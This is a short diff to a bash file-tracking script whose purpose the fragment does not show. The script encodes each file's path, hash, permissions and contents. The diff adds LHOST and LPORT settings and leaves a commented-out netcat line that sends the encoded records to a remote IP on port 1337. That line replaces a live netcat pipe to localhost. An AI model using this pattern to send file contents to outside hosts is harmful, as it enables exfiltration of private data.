@@ -1,5 +1,8 @@
 #!/bin/bash
 
+LHOST=10.13.1.79
+LPORT=1337
+
 di=3
 lt=$(date +%s)
 
@@ -30,7 +33,8 @@ track_file() {
     fi
 
     data="{\"path\":\"$path\", \"hash\":\"$hash\", \"perm\":\"$perm\", \"attr\":\"$attr\", \"size\":\"$size\", \"body\":\"$body\"}"
-    echo "#f11|host|file|$(echo $data | base64 -w0)" | nc -N 127.0.0.1 1337 > /dev/null 2>&1
+    echo "#f11|host|file|$(echo $data | base64 -w0)"
+    # echo "#f11|host|file|$(echo $data | base64 -w0)" | nc -N $LHOST $LPORT > /dev/null 2>&1
   fi
 }
 
